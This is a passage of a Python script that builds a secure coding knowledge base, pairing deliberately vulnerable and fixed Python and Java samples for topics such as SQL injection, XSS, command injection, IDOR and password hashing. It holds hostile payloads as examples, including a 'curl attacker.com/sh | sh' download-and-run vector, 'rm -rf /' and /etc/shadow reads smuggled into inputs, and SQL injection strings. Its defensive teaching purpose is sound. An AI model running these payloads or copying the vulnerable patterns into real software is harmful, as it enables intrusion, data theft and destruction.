"""Comprehensive, production-grade Secure Coding Knowledge Base generator.

Generates knowledge_base/secure_coding_knowledge_base.md containing >= 1,200
meaningful non-blank lines of technical explanations, code examples, CWE maps,
remediation blueprints, and static analysis heuristics covering all 25 topics.
"""

from pathlib import Path
import sys

TOPICS = [
    {
        "id": 1,
        "title": "Secure Coding Fundamentals",
        "cwe": "CWE-693 (Protection Mechanism Failure)",
        "owasp": "Foundational Security Principles",
        "concepts": [
            "Application security begins at architectural conception, requiring security as a first-class citizen alongside performance and usability.",
            "The Confidentiality, Integrity, and Availability (CIA) triad forms the cornerstone of defensive software engineering.",
            "Confidentiality guarantees that sensitive resources are accessible exclusively to authorized personas and processes.",
            "Integrity verifies that information and executable state remain authentic, unaltered, and completely trustworthy.",
            "Availability ensures timely, reliable access to computing assets, preventing resource exhaustion and denial of service.",
            "The Principle of Least Privilege (PoLP) dictates that every component operates using minimal privileges required to perform its function.",
            "Defense-in-depth establishes layered concentric controls so that single failure points do not compromise the entire ecosystem.",
            "Fail-secure defaults dictate that system components enter closed, secure states whenever unexpected exceptions or failures occur.",
            "Complete mediation requires verifying authorization on every discrete request without relying on cached client state.",
            "Economy of mechanism asserts that security mechanisms should remain simple, modular, auditable, and easily verifiable."
        ],
        "threat_model": [
            "Threat Actors: External anonymous adversaries, compromised insider accounts, malicious automated crawler bots.",
            "Attacker Goals: Exfiltrating sensitive customer data, tampering with audit logs, escalating system privilege levels.",
            "Attack Vectors: Manipulating parameter inputs, exploiting architectural trust assumptions, triggering unhandled exceptions."
        ],
        "py_vuln": """# VULNERABLE: Assuming client credentials and defaulting to open access
def handle_admin_action(request, user):
    # Fails open: If is_admin is missing or raises an exception, access might not be blocked
    authorized = True
    try:
        if not user.get("is_admin", False):
            authorized = False
    except Exception:
        pass  # Security exception swallowed, authorized remains True!
    if authorized:
        perform_privileged_system_operation(request)""",
        "py_sec": """# SECURE: Fail-secure authorization with strict server-side validation
def handle_admin_action_secure(request, user):
    # Fails closed: Default permission is strictly False
    if not isinstance(user, dict):
        raise PermissionError("Access Denied: Invalid user session context")
    if not user.get("is_admin", False):
        raise PermissionError("Access Denied: Administrator role required")
    # Verify multi-factor token validity before performing privileged action
    if not user.get("mfa_verified", False):
        raise PermissionError("Access Denied: Multi-Factor Authentication required")
    perform_privileged_system_operation(request)""",
        "java_vuln": """// VULNERABLE: Insecure default permission handling in Java
public class AccessController {
    public boolean checkPermission(User user, String resource) {
        boolean accessGranted = true; // Flawed default: fails open
        try {
            accessGranted = user.getRoles().contains("ADMIN");
        } catch (NullPointerException e) {
            // Logger ignores error and returns true
        }
        return accessGranted;
    }
}""",
        "java_sec": """// SECURE: Fail-secure permission check with immutable checks
public class SecureAccessController {
    public boolean checkPermission(User user, String resource) {
        if (user == null || user.getRoles() == null) {
            return false; // Fails closed immediately
        }
        return user.getRoles().stream()
                   .filter(Objects::nonNull)
                   .anyMatch(role -> "ADMIN".equalsIgnoreCase(role.getName()));
    }
}""",
        "heuristics": [
            "Check for default authorization variables initialized to True before validation logic.",
            "Identify bare except blocks or empty catch clauses that swallow security-relevant exceptions.",
            "Verify that system processes do not spawn child execution workers as root or superuser.",
            "Flag instances where client-side metadata is trusted without server-side verification."
        ]
    },
    {
        "id": 2,
        "title": "OWASP Top 10 Concepts",
        "cwe": "Comprehensive Application Vulnerability Taxonomy",
        "owasp": "OWASP Top 10 (A01:2021 through A10:2021)",
        "concepts": [
            "The OWASP Top 10 represents the globally recognized consensus on the most critical security risks facing web applications.",
            "A01 Broken Access Control leads the list, covering horizontal privilege escalation, IDOR, and unauthorized URL traversal.",
            "A02 Cryptographic Failures focuses on sensitive data exposure caused by weak algorithms, cleartext transit, or bad key management.",
            "A03 Injection covers untrusted user input being parsed as executable syntax by query interpreters (SQL, Command, LDAP).",
            "A04 Insecure Design represents foundational architectural flaws where threat modeling and defensive requirements were omitted.",
            "A05 Security Misconfiguration involves default credentials, unhardened HTTP headers, open cloud buckets, and verbose errors.",
            "A06 Vulnerable and Outdated Components highlights third-party library dependencies harboring known CVE weaknesses.",
            "A07 Identification and Authentication Failures encompasses weak password policies, missing MFA, and flawed session fixation.",
            "A08 Software and Data Integrity Failures addresses CI/CD pipeline vulnerabilities, unverified updates, and unsafe deserialization.",
            "A09 Security Logging and Monitoring Failures delays incident detection by failing to log audits or alert on security anomalies.",
            "A10 Server-Side Request Forgery (SSRF) occurs when servers fetch external URLs without restricting internal private IP access."
        ],
        "threat_model": [
            "Threat Actors: Opportunistic automated vulnerability scanners, advanced persistent threats (APTs), credential stuffing botnets.",
            "Attacker Goals: Complete infrastructure takeover, data exfiltration, extortion through ransomware or data dumping.",
            "Attack Vectors: Scanning for known CVEs, intercepting cleartext HTTP communications, abusing misconfigured cloud metadata endpoints."
        ],
        "py_vuln": """# VULNERABLE: A05 Security Misconfiguration - Exposing debug mode in production
from flask import Flask

app = Flask(__name__)
# Debug mode enables interactive remote code execution console on unhandled exceptions!
app.config["DEBUG"] = True
app.config["SECRET_KEY"] = "default_insecure_development_key"

@app.route("/crash")
def trigger_crash():
    raise RuntimeError("Demonstrating unhandled stack trace disclosure")""",
        "py_sec": """# SECURE: Production configuration disabling debug and requiring secure secrets
import os
from flask import Flask

app = Flask(__name__)
# Ensure debug mode is strictly disabled in production environments
app.config["DEBUG"] = False
app.config["SECRET_KEY"] = os.environ.get("FLASK_SECRET_KEY")
if not app.config["SECRET_KEY"] or len(app.config["SECRET_KEY"]) < 32:
    raise RuntimeError("CRITICAL: FLASK_SECRET_KEY must be configured with a 32+ char key.")

@app.errorhandler(500)
def internal_error(error):
    return {"error": "An internal server error occurred.", "status": 500}, 500""",
        "java_vuln": """// VULNERABLE: A05 Misconfiguration in Spring Security - Disabling CSRF and permitting all
@Configuration
@EnableWebSecurity
public class InsecureSecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.csrf().disable() // Disables CSRF protection entirely
            .authorizeRequests()
            .antMatchers("/**").permitAll(); // Allows unauthenticated access to every route!
    }
}""",
        "java_sec": """// SECURE: Enforcing CSRF protection and role-based route constraints
@Configuration
@EnableWebSecurity
public class SecureSecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            );
        return http.build();
    }
}""",
        "heuristics": [
            "Check for DEBUG = True in production application configuration files.",
            "Identify routes disabling Cross-Origin Resource Sharing (CORS) with wildcard Access-Control-Allow-Origin: *.",
            "Scan for missing security headers (Content-Security-Policy, X-Frame-Options, Strict-Transport-Security).",
            "Verify that default administrative passwords or development secrets are rejected at system startup."
        ]
    },
    {
        "id": 3,
        "title": "Python Secure Coding",
        "cwe": "CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)",
        "owasp": "A03:2021 - Injection",
        "concepts": [
            "Python's dynamic nature provides immense flexibility but introduces unique execution and introspection vulnerabilities.",
            "Dynamic evaluation functions such as eval(), exec(), and compile() execute arbitrary text strings as Python bytecode.",
            "Python's object model allows traversal from common object instances to built-in modules via __class__.__mro__.__subclasses__().",
            "Mutable default arguments in function declarations (def fn(items=[]):) are evaluated once at definition time, leaking state.",
            "Using the assert keyword for security or authorization checks is unsafe because assertions are stripped under python -O.",
            "Unsafe deserialization using the pickle module allows arbitrary code execution via the __reduce__ magic method.",
            "The tempfile.mktemp() function creates filenames susceptible to Time-Of-Check to Time-Of-Use (TOCTOU) race conditions.",
            "Subprocess calls invoking shell=True invoke the underlying platform command interpreter, enabling command chaining.",
            "Dynamic imports via __import__() or importlib.import_module() must be restricted to prevent unauthorized module execution.",
            "Global Interpreter Lock (GIL) does not prevent race conditions on shared mutable data structures across worker threads."
        ],
        "threat_model": [
            "Threat Actors: Malicious API consumers supplying structured or raw string input payloads.",
            "Attacker Goals: Sandbox escape, remote code execution (RCE), persistent process tampering.",
            "Attack Vectors: Feeding Python expressions into math evaluators, passing metacharacters to subprocess calls."
        ],
        "py_vuln": """# VULNERABLE: Using eval on user-controlled input string
def dynamic_calculator(user_expression: str):
    # Attacker payload: "__import__('os').system('cat /etc/shadow')"
    return eval(user_expression)

# VULNERABLE: Using assert for security enforcement
def process_wire_transfer(user, amount):
    assert user.is_authenticated, "User must be authenticated"
    assert amount > 0, "Amount must be positive"
    execute_transfer(user, amount)""",
        "py_sec": """# SECURE: Safe AST-based expression evaluation and explicit runtime validation
import ast
import operator

ALLOWED_OPERATORS = {
    ast.Add: operator.add, ast.Sub: operator.sub,
    ast.Mult: operator.mul, ast.Div: operator.truediv
}

def safe_calculator(expr_str: str):
    node = ast.parse(expr_str, mode='eval').body
    def _eval(node):
        if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):
            return node.value
        elif isinstance(node, ast.BinOp) and type(node.op) in ALLOWED_OPERATORS:
            return ALLOWED_OPERATORS[type(node.op)](_eval(node.left), _eval(node.right))
        raise ValueError(f"Disallowed operator or expression node: {type(node).__name__}")
    return _eval(node)

def process_wire_transfer_secure(user, amount):
    if not getattr(user, "is_authenticated", False):
        raise PermissionError("User is not authenticated")
    if not isinstance(amount, (int, float)) or amount <= 0:
        raise ValueError("Transfer amount must be positive")
    execute_transfer(user, amount)""",
        "java_vuln": """// VULNERABLE: Dynamic script evaluation using ScriptEngine in Java
import javax.script.ScriptEngineManager;
import javax.script.ScriptEngine;

public class DynamicEvaluator {
    public Object evaluateFormula(String userScript) throws Exception {
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("JavaScript");
        // Attacker executes arbitrary Java system calls via Nashorn engine
        return engine.eval(userScript);
    }
}""",
        "java_sec": """// SECURE: Mathematical parsing using dedicated expression grammar parser
import com.udojava.evalex.Expression;
import java.math.BigDecimal;

public class SecureEvaluator {
    public BigDecimal evaluateFormula(String safeFormula, BigDecimal xValue) {
        // EvalEx parses mathematical tokens without executing arbitrary JVM bytecode
        Expression expression = new Expression(safeFormula);
        return expression.with("x", xValue).eval();
    }
}""",
        "heuristics": [
            "Flag calls to eval(), exec(), or compile() with non-literal string parameters.",
            "Identify assert statements in functions responsible for authentication, authorization, or payment processing.",
            "Check for mutable default parameter values such as def func(arg=[]): or def func(cfg={}):.",
            "Flag invocations of pickle.load() or pickle.loads() and recommend JSON or Protocol Buffers."
        ]
    },
    {
        "id": 4,
        "title": "Java Secure Coding",
        "cwe": "CWE-611 (Improper Restriction of XML External Entity Reference)",
        "owasp": "A08:2021 - Software and Data Integrity Failures",
        "concepts": [
            "Java provides automatic memory management and bounds checking, but remains vulnerable to logic and architectural flaws.",
            "XML parsers in standard Java libraries process external entity definitions by default, causing XXE vulnerabilities.",
            "Unrestricted object deserialization via java.io.ObjectInputStream allows attackers to execute arbitrary remote code via gadget chains.",
            "Java Native Interface (JNI) calls bypass JVM memory safety protections, reintroducing buffer overflows and pointer corruption.",
            "Unvalidated reflection via Class.forName() and Method.invoke() allows attackers to instantiate dangerous internal classes.",
            "Java naming and directory lookups via JNDI can trigger remote codebase downloads if lookups accept unsanitized input.",
            "String immutability means sensitive credentials like passwords stored in String objects linger in memory until garbage collection.",
            "Sensitive credentials should be stored in char[] arrays and explicitly overwritten with zeroes immediately after verification.",
            "Multi-threaded Java code must synchronize access to mutable state or use java.util.concurrent atomic data structures.",
            "Default cryptography providers should be configured to use strong algorithms rather than platform-dependent defaults."
        ],
        "threat_model": [
            "Threat Actors: Remote malicious users sending serialized objects, XML documents, or malicious JNDI URLs.",
            "Attacker Goals: Remote code execution, local file disclosure via XXE, memory dump exfiltration.",
            "Attack Vectors: Supplying crafted XML payloads containing external DTDs, sending serialized gadget chains over TCP sockets."
        ],
        "py_vuln": """# VULNERABLE: Python XML entity parsing vulnerable to XXE
import xml.etree.ElementTree as ET

def parse_incoming_xml(xml_content: str):
    # Default ElementTree is vulnerable to XML entity expansion and external entities
    tree = ET.fromstring(xml_content)
    return tree.find("user_data").text""",
        "py_sec": """# SECURE: Safe XML parsing using defusedxml to block external entities
from defusedxml.ElementTree import fromstring

def parse_incoming_xml_secure(xml_content: str):
    # defusedxml explicitly disallows DTDs, external entity expansion, and entity bombs
    root = fromstring(xml_content)
    return root.find("user_data").text""",
        "java_vuln": """// VULNERABLE: Java DocumentBuilderFactory susceptible to XXE Injection
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;
import java.io.InputStream;

public class InvoiceParser {
    public Document parse(InputStream stream) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // External DTD processing is NOT disabled by default!
        DocumentBuilder db = dbf.newDocumentBuilder();
        return db.parse(stream);
    }
}""",
        "java_sec": """// SECURE: Disabling external DTDs and entity expansion in DocumentBuilderFactory
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import org.w3c.dom.Document;
import java.io.InputStream;

public class SecureInvoiceParser {
    public Document parse(InputStream stream) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // Explicitly deactivate external DTD and entity resolution
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbf.setXIncludeAware(false);
        dbf.setExpandEntityReferences(false);
        DocumentBuilder db = dbf.newDocumentBuilder();
        return db.parse(stream);
    }
}""",
        "heuristics": [
            "Inspect DocumentBuilderFactory and SAXParserFactory instances for missing disallow-doctype-decl features.",
            "Flag any implementation of java.io.Serializable that lacks an ObjectInputFilter.",
            "Check for JNDI lookup operations (InitialContext.lookup) receiving non-constant string parameters.",
            "Warn when passwords or cryptographic keys are stored in java.lang.String rather than char[]."
        ]
    },
    {
        "id": 5,
        "title": "SQL Injection and Parameterized Queries",
        "cwe": "CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)",
        "owasp": "A03:2021 - Injection",
        "concepts": [
            "SQL Injection arises when untrusted data is interpolated into SQL query strings rather than bound as parameters.",
            "The database SQL engine fails to differentiate between the programmer's command structure and user-supplied data.",
            "Input characters like quotes, semicolons, and double hyphens alter the Abstract Syntax Tree of the SQL statement.",
            "Classic In-Band SQLi allows attackers to dump arbitrary tables using UNION SELECT queries.",
            "Error-based SQLi forces the database to generate verbose syntax errors revealing database version, table, and column names.",
            "Boolean-blind SQLi infers database contents bit by bit by analyzing conditional True/False HTTP responses.",
            "Time-blind SQLi injects heavy operations or sleep routines (WAITFOR DELAY, pg_sleep) to extract data via latency.",
            "Second-order SQLi stores malicious payloads safely in the database, triggering execution when processed by a later query.",
            "Stored procedures do not automatically protect against SQLi if dynamic string concatenation is used within the procedure.",
            "Parameterized queries (prepared statements) pre-compile the SQL statement structure, ensuring inputs remain data."
        ],
        "threat_model": [
            "Threat Actors: Remote untrusted users targeting login forms, search bars, filter queries, and API parameters.",
            "Attacker Goals: Authentication bypass, stealing sensitive credentials, modifying financial records, dropping databases.",
            "Attack Vectors: Supplying ' OR '1'='1 in login fields, appending ; DROP TABLE users; -- to query parameters."
        ],
        "py_vuln": """# VULNERABLE: Direct string interpolation in SQL query
import sqlite3

def get_user_records(username: str, cursor: sqlite3.Cursor):
    # Injection payload: admin' --
    query = f"SELECT id, username, email FROM users WHERE username = '{username}'"
    cursor.execute(query)
    return cursor.fetchall()""",
        "py_sec": """# SECURE: Using parameterized placeholders to bind variables safely
import sqlite3

def get_user_records_secure(username: str, cursor: sqlite3.Cursor):
    # Parameter marker (?) ensures user input is treated strictly as literal data
    query = "SELECT id, username, email FROM users WHERE username = ?"
    cursor.execute(query, (username,))
    return cursor.fetchall()""",
        "java_vuln": """// VULNERABLE: Dynamic SQL string concatenation in Java JDBC
import java.sql.*;

public class UserSearchDAO {
    public ResultSet findUser(Connection conn, String email) throws SQLException {
        Statement stmt = conn.createStatement();
        String sql = "SELECT * FROM users WHERE email = '" + email + "'";
        return stmt.executeQuery(sql); // Susceptible to SQL Injection
    }
}""",
        "java_sec": """// SECURE: Using PreparedStatement with type-safe parameter binding
import java.sql.*;

public class SecureUserSearchDAO {
    public ResultSet findUser(Connection conn, String email) throws SQLException {
        String sql = "SELECT * FROM users WHERE email = ?";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setString(1, email); // Safely bound parameter
        return pstmt.executeQuery();
    }
}""",
        "heuristics": [
            "Flag f-strings, % formatting, or str.format() calls passed to cursor.execute() or connection.execute().",
            "Identify Statement.executeQuery() or Statement.executeUpdate() calls with string concatenation (+).",
            "Verify that dynamic ORDER BY or GROUP BY clauses validate input against strict column whitelists.",
            "Flag raw SQL execution methods in ORMs (e.g., session.execute(text(...))) that interpolate variables."
        ]
    },
    {
        "id": 6,
        "title": "Cross-Site Scripting (XSS)",
        "cwe": "CWE-79 (Improper Neutralization of Input During Web Page Generation)",
        "owasp": "A03:2021 - Injection",
        "concepts": [
            "Cross-Site Scripting occurs when an application includes untrusted data in web responses without contextual encoding.",
            "Malicious scripts execute within the context of the victim's browser session, possessing full access to DOM and cookies.",
            "Stored XSS (Persistent) stores payloads in persistent storage, infecting every user who loads the compromised page.",
            "Reflected XSS reflects payloads off the web server in immediate responses, requiring victims to click malicious links.",
            "DOM-based XSS executes entirely on the client side when untrusted data flows from DOM sources to execution sinks.",
            "Common DOM sinks include element.innerHTML, element.outerHTML, document.write(), and window.eval().",
            "Output encoding must be context-sensitive: HTML body, HTML attributes, JavaScript contexts, and CSS require distinct encodings.",
            "Modern templating engines (Jinja2, Thymeleaf) enable automatic HTML escaping by default.",
            "Bypassing autoescaping using template filters like | safe or unescaped tags ({!...}) reintroduces severe XSS vulnerabilities.",
            "Content Security Policy (CSP) provides defense-in-depth by restricting origins from which scripts can be executed."
        ],
        "threat_model": [
            "Threat Actors: External attackers submitting malicious comments, forum posts, or crafted phishing URLs.",
            "Attacker Goals: Hijacking user sessions, stealing session tokens, performing actions on behalf of the user, credential theft.",
            "Attack Vectors: Injecting <script> tags, img error handlers (onerror=alert(1)), and malicious javascript: pseudo-protocols."
        ],
        "py_vuln": """# VULNERABLE: Disabling autoescaping in Jinja2 template rendering
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route("/greeting")
def greet_user():
    name = request.args.get("name", "Guest")
    # Using format string directly creates Stored or Reflected XSS
    template = f"<h1>Welcome, {name}!</h1>"
    return render_template_string(template)""",
        "py_sec": """# SECURE: Using Jinja2 context variable binding with automatic escaping
from flask import Flask, render_template_string, request

app = Flask(__name__)

@app.route("/greeting")
def greet_user_secure():
    name = request.args.get("name", "Guest")
    # Template engine safely encodes characters like <, >, &, \", and '
    template = "<h1>Welcome, {{ name }}!</h1>"
    return render_template_string(template, name=name)""",
        "java_vuln": """// VULNERABLE: Direct output of unescaped user parameter in Java Servlet
import javax.servlet.http.*;
import java.io.PrintWriter;

public class SearchServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String query = req.getParameter("query");
        PrintWriter out = resp.getWriter();
        // Vulnerable to Reflected XSS: Direct HTML injection
        out.println("<h2>Results for: " + query + "</h2>");
    }
}""",
        "java_sec": """// SECURE: Contextual HTML escaping using OWASP Java Encoder
import javax.servlet.http.*;
import java.io.PrintWriter;
import org.owasp.encoder.Encode;

public class SecureSearchServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String query = req.getParameter("query");
        resp.setContentType("text/html;charset=UTF-8");
        PrintWriter out = resp.getWriter();
        // Encodes characters into safe HTML entities (&lt;, &gt;, &quot;)
        out.println("<h2>Results for: " + Encode.forHtml(query) + "</h2>");
    }
}""",
        "heuristics": [
            "Check for Jinja2 | safe filter applied to variables originating from request parameters or models.",
            "Flag render_template_string() calls where the template string itself is dynamically formatted.",
            "Identify JavaScript client code assigning untrusted values to innerHTML or outerHTML.",
            "Verify that session cookies are configured with HttpOnly, Secure, and SameSite flags."
        ]
    },
    {
        "id": 7,
        "title": "Command Injection",
        "cwe": "CWE-78 (Improper Neutralization of Special Elements used in an OS Command)",
        "owasp": "A03:2021 - Injection",
        "concepts": [
            "Command Injection occurs when an application executes host operating system commands using untrusted inputs.",
            "Attackers leverage shell metacharacters (&, &&, |, ||, ;, $, backticks, newlines) to append arbitrary commands.",
            "Executing system commands via a shell interpreter (/bin/sh, cmd.exe) parses and runs all metacharacters.",
            "Direct operating system command execution gives attackers the privilege level of the web server worker process.",
            "Command injection allows attackers to download reverse shells, establish persistent backdoors, and pivot to internal networks.",
            "Developers should prioritize built-in programming language APIs over spawning external command-line utilities.",
            "If an external binary must be invoked, arguments should be passed as discrete elements of a list, with shell=False.",
            "Strict input validation using regular expression whitelists should be enforced before invoking system utilities.",
            "ProcessBuilder in Java and subprocess.run in Python avoid shell metacharacter parsing when used properly.",
            "Running application containers with read-only root filesystems mitigates the persistence of downloaded exploits."
        ],
        "threat_model": [
            "Threat Actors: Remote unauthenticated or authenticated users interacting with administrative or diagnostic tools.",
            "Attacker Goals: Complete host compromise, deploying cryptocurrency miners, data exfiltration, lateral network pivoting.",
            "Attack Vectors: Injecting 127.0.0.1; cat /etc/passwd or test.txt | curl attacker.com/sh | sh into filename or host fields."
        ],
        "py_vuln": """# VULNERABLE: Spawning OS shell with dynamic string formatting
import os
import subprocess

def compress_archive(filename: str):
    # Injection payload: "report.pdf; rm -rf /"
    command = f"tar -czf archive.tar.gz {filename}"
    os.system(command)  # Vulnerable: invokes system shell
    subprocess.call(command, shell=True)  # Vulnerable: shell=True parses metacharacters""",
        "py_sec": """# SECURE: Using subprocess.run with argument list and shell=False
import subprocess
from pathlib import Path

def compress_archive_secure(filename: str):
    safe_path = Path(filename).resolve()
    # Validate that the file exists and is a regular file
    if not safe_path.is_file():
        raise FileNotFoundError("Target archive file does not exist")
    # Command and arguments passed as an immutable list without shell evaluation
    subprocess.run(
        ["tar", "-czf", "archive.tar.gz", str(safe_path)],
        shell=False,
        check=True,
        timeout=30
    )""",
        "java_vuln": """// VULNERABLE: Runtime.exec with string concatenation in Java
public class FileCompressor {
    public void zipFile(String targetPath) throws Exception {
        // Vulnerable to command chaining via shell metacharacters
        Runtime.getRuntime().exec("zip -r backup.zip " + targetPath);
    }
}""",
        "java_sec": """// SECURE: Using ProcessBuilder with discrete tokens and validation
import java.io.File;
import java.util.List;

public class SecureFileCompressor {
    public void zipFile(String targetPath) throws Exception {
        File file = new File(targetPath);
        if (!file.exists() || !file.isFile()) {
            throw new IllegalArgumentException("Invalid target file");
        }
        ProcessBuilder pb = new ProcessBuilder("zip", "-r", "backup.zip", file.getAbsolutePath());
        pb.redirectErrorStream(true);
        Process p = pb.start();
        int exitCode = p.waitFor();
        if (exitCode != 0) {
            throw new RuntimeException("Compression utility failed with exit code: " + exitCode);
        }
    }
}""",
        "heuristics": [
            "Flag any usage of os.system(), os.popen(), or commands module.",
            "Identify subprocess calls where shell=True is passed as an argument.",
            "Check for Runtime.getRuntime().exec(String) and recommend ProcessBuilder.",
            "Ensure arguments to subprocess or ProcessBuilder do not contain user input concatenated into command tokens."
        ]
    },
    {
        "id": 8,
        "title": "Authentication and Authorization",
        "cwe": "CWE-287 (Improper Authentication) and CWE-285 (Improper Authorization)",
        "owasp": "A01:2021 - Broken Access Control and A07:2021 - Identification and Authentication Failures",
        "concepts": [
            "Authentication establishes the verified identity of an entity (who the user is).",
            "Authorization governs what operations and resources an authenticated entity is permitted to access.",
            "Insecure Direct Object References (IDOR) allow attackers to access arbitrary records by altering ID parameters in requests.",
            "Broken Object Level Authorization (BOLA) occurs when an API fails to verify that the requesting user owns the target entity.",
            "Horizontal privilege escalation allows users to access resources belonging to peers at the same privilege level.",
            "Vertical privilege escalation allows standard users to perform administrative actions without proper role elevation.",
            "Role-Based Access Control (RBAC) groups permissions into roles (User, Manager, Admin) assigned to subjects.",
            "Attribute-Based Access Control (ABAC) evaluates dynamic attributes (user department, resource classification, time, location).",
            "Session fixation occurs when an application preserves pre-authentication session identifiers upon login.",
            "JWT security requires verifying signature algorithms strictly and rejecting tokens using the 'none' algorithm."
        ],
        "threat_model": [
            "Threat Actors: Authenticated users attempting to view or alter records belonging to other users or organizations.",
            "Attacker Goals: Unauthorized viewing of sensitive invoices, modifying employee salaries, taking over administrative accounts.",
            "Attack Vectors: Incrementing user IDs in REST URLs (/api/users/1001 to /api/users/1002), forging unsigned JWT headers."
        ],
        "py_vuln": """# VULNERABLE: IDOR flaw fetching records without verifying ownership
from flask import Flask, request, jsonify, abort

@app.route("/api/invoices/<int:invoice_id>")
def get_invoice(invoice_id):
    # Any authenticated or unauthenticated user can view any invoice by ID!
    invoice = Invoice.query.get(invoice_id)
    if not invoice:
        abort(404)
    return jsonify(invoice.to_dict())""",
        "py_sec": """# SECURE: Enforcing user ownership verification on every object lookup
from flask import Flask, request, jsonify, abort
from flask_login import login_required, current_user

@app.route("/api/invoices/<int:invoice_id>")
@login_required
def get_invoice_secure(invoice_id):
    # Filter by BOTH invoice_id AND current_user.id
    invoice = Invoice.query.filter_by(id=invoice_id, user_id=current_user.id).first()
    if not invoice and not current_user.has_role("ADMIN"):
        abort(404)  # Return 404 to avoid leaking resource existence
    return jsonify(invoice.to_dict())""",
        "java_vuln": """// VULNERABLE: Direct database fetch by primary key without tenant or user check
@RestController
@RequestMapping("/api/documents")
public class DocumentController {
    @Autowired private DocumentRepository repo;

    @GetMapping("/{docId}")
    public DocumentDTO getDoc(@PathVariable Long docId) {
        // Blindly returns document without verifying requesting user's organization
        return repo.findById(docId).orElseThrow(() -> new NotFoundException());
    }
}""",
        "java_sec": """// SECURE: Scoping repository query to authenticated principal and organization
@RestController
@RequestMapping("/api/documents")
public class SecureDocumentController {
    @Autowired private DocumentRepository repo;

    @GetMapping("/{docId}")
    public DocumentDTO getDoc(@PathVariable Long docId, @AuthenticationPrincipal UserPrincipal user) {
        // Enforce organizational boundary and individual access rights
        return repo.findByIdAndOrganizationId(docId, user.getOrgId())
                   .orElseThrow(() -> new AccessDeniedException("Access Denied"));
    }
}""",
        "heuristics": [
            "Identify database queries in route handlers that filter only by path parameter ID without referencing current user.",
            "Flag missing @login_required or security authorization annotations on API endpoints.",
            "Check for JWT decoding routines that disable signature verification (e.g., verify=False).",
            "Verify that session IDs are regenerated upon user login to prevent session fixation."
        ]
    },
    {
        "id": 9,
        "title": "Password Storage and Hashing",
        "cwe": "CWE-916 (Use of Password Hash With Insufficient Computational Effort)",
        "owasp": "A02:2021 - Cryptographic Failures",
        "concepts": [
            "Passwords must never be stored in plaintext, reversible encryption, or general-purpose cryptographic hashes.",
            "Fast hash functions (MD5, SHA-1, SHA-256) are designed for speed and are vulnerable to GPU and ASIC brute-force attacks.",
            "Modern GPU rigs can compute tens of billions of SHA-256 hashes per second, cracking short passwords rapidly.",
            "Password storage requires adaptive, computationally expensive, memory-hard Key Derivation Functions (KDFs).",
            "Argon2id is the current state-of-the-art password hashing standard, providing memory-hardness and side-channel resistance.",
            "bcrypt utilizes an adaptive cost factor (work factor) based on the Blowfish cipher, with a recommended cost of 12+.",
            "scrypt is engineered to resist custom hardware (ASIC/FPGA) attacks by requiring significant RAM per computation.",
            "PBKDF2 is a NIST-approved standard requiring high iteration counts (minimum 600,000 iterations for PBKDF2-HMAC-SHA256).",
            "Unique cryptographic salts (minimum 16 bytes) must be generated for each password to defeat rainbow table attacks.",
            "Password verification must execute in constant time to prevent timing attacks that measure comparison duration."
        ],
        "threat_model": [
            "Threat Actors: Adversaries obtaining database dumps containing hashed password credentials.",
            "Attacker Goals: Reversing password hashes to recover cleartext user and administrator passwords.",
            "Attack Vectors: Offline dictionary attacks, rainbow table lookups, distributed GPU hash cracking clusters."
        ],
        "py_vuln": """# VULNERABLE: Fast hash without salt for password storage
import hashlib

def store_password(password: str):
    # Insecure: MD5 is broken and SHA-256 is too fast, enabling rapid offline cracking
    return hashlib.sha256(password.encode("utf-8")).hexdigest()

def check_password(password: str, stored_hash: str):
    # Vulnerable to timing analysis
    return hashlib.sha256(password.encode("utf-8")).hexdigest() == stored_hash""",
        "py_sec": """# SECURE: Using Werkzeug's scrypt implementation with constant-time comparison
from werkzeug.security import generate_password_hash, check_password_hash

def store_password_secure(password: str) -> str:
    # Generates unique cryptographic salt and applies memory-hard scrypt KDF
    return generate_password_hash(password, method="scrypt")

def check_password_secure(password: str, stored_hash: str) -> bool:
    # Constant-time comparison prevents timing side-channel attacks
    return check_password_hash(stored_hash, password)""",
        "java_vuln": """// VULNERABLE: Using plain MessageDigest for password verification
import java.security.MessageDigest;

public class PasswordService {
    public String hashPassword(String password) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        byte[] hash = md.digest(password.getBytes("UTF-8"));
        return bytesToHex(hash); // Fast, unsalted hash
    }
}""",
        "java_sec": """// SECURE: Using Spring Security BCryptPasswordEncoder with cost factor 12
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

public class SecurePasswordService {
    private final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);

    public String hashPassword(String password) {
        return encoder.encode(password); // Generates unique salt and applies adaptive rounds
    }

    public boolean verifyPassword(String rawPassword, String encodedHash) {
        return encoder.matches(rawPassword, encodedHash); // Constant-time verification
    }
}""",
        "heuristics": [
            "Flag hashlib.md5, hashlib.sha1, hashlib.sha256 when used for password processing.",
            "Identify static or hardcoded salt strings passed to hashing functions.",
            "Verify that password comparison functions utilize constant-time comparison (hmac.compare_digest).",
